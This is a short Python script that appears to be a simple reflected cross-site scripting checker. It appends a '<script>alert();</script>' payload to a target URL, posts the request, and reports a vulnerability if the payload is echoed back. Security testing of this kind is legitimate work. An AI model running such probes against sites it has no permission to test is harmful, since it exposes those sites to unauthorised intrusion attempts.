import requests

def xss(target):
    
    payload = "<script>alert();</script>"
    req = requests.post(target + payload)

    if payload in req.text:
        print("XSS Vulnerability Discovered!")
        print("Attacking Payload: "+payload)
    else:
        print("Secure")